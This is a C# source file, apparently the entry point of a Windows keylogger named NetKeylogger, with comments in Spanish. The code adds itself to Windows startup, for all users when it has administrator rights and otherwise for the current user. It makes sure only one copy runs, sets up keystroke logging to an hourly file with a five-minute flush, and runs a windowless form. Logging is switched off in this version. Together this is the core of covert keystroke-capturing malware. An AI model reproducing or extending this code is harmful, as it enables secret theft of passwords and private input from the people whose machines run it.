using System;
using System.Diagnostics;
using System.Reflection;
using System.Windows.Forms;

namespace Keylogger
{
    static class Program
    {
        public static NetKeylogger kl;

        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>
        [STAThread]
        static void Main()
        {
            if (ExistApp()) return;
            if (!StartUpManager.IsStartup())
            {
                if (StartUpManager.IsUserAdministrator())
                    StartUpManager.AddApplicationToAllUserStartup();
                else
                    StartUpManager.AddApplicationToCurrentUserStartup();
            }

            //Assembly asmPath = System.Reflection.Assembly.GetExecutingAssembly();
            //string exePath = asmPath.Location.Substring(0, asmPath.Location.LastIndexOf("\\"));

            kl = new NetKeylogger();
            var interval = 300000; // 5 minutos
            kl.LOG_OUT = "file";
            kl.LOG_MODE = "hour"; // hour o day
            kl.LOG_FILE = Application.StartupPath + "/netLogger";
            kl.Enabled = false; // enable key logging
            kl.FlushInterval = interval; // set Interval

            

            //var handle = GetConsoleWindow();
            // Hide
            //ShowWindow(handle, SW_HIDE);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            var frm = new Form1();
            Application.Run();
        }

        private static bool ExistApp()
        {
            // Desde el cmd http://ss64.com/nt/reg.html
            try
            {
                var proc = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
                //if (proc.Length > 1)
                //    ShowWindow(proc[0].MainWindowHandle, SW_SHOWMAXIMIZED);
                Debug.Assert(proc.Length == 1, "Existe otra instancia");
                return proc.Length > 1;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
            return false;
        }

    }
}
